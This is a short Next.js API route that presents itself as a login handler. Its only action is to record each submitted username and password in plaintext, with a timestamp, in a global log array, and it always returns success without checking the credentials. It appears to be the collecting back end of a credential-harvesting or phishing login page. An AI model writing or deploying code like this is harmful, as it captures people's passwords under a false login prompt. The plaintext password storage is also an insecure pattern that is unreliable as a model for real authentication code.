import { NextResponse } from 'next/server';

// Initialize global storage for logs if it doesn't exist
if (!global.loginLogs) {
  global.loginLogs = [];
}

export async function POST(request) {
  try {
    const { username, password } = await request.json();

    // Record the submitted credentials along with a timestamp
    const timestamp = new Date().toLocaleString();
    global.loginLogs.unshift({ username, password, timestamp });

    return NextResponse.json({ success: true });
  } catch (err) {
    return NextResponse.json({ error: 'Failed to process login' }, { status: 500 });
  }
}
